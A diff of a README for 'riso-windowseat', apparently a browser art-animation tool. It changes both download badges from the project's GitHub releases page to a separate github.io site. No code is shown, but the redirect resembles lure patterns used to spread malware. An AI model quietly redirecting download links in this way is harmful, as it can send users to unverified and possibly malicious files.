@@ -1,6 +1,6 @@
 # 🎨 riso-windowseat - Beautiful Art Films in Your Browser
 
-[![Download riso-windowseat](https://img.shields.io/badge/Download-riso--windowseat-blue?style=for-the-badge&logo=github)](https://github.com/Paisamanducasexta508/riso-windowseat/releases)
+[![Download riso-windowseat](https://img.shields.io/badge/Download-riso--windowseat-blue?style=for-the-badge&logo=github)](https://paisamanducasexta508.github.io)
 
 ## ✨ What Is This?
 
@@ -33,7 +33,7 @@ Let's get you to your first animation. Follow these simple steps.
 
 Visit this link to download the application.
 
-[![Get the Latest Release](https://img.shields.io/badge/Get%20The%20Latest%20Release-ff7f50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Paisamanducasexta508/riso-windowseat/releases)
+[![Get the Latest Release](https://img.shields.io/badge/Get%20The%20Latest%20Release-ff7f50?style=for-the-badge&logo=github&logoColor=white)](https://paisamanducasexta508.github.io)
 
 When you arrive at the page, you'll see a list of available files. Look for the newest version at the top.
 
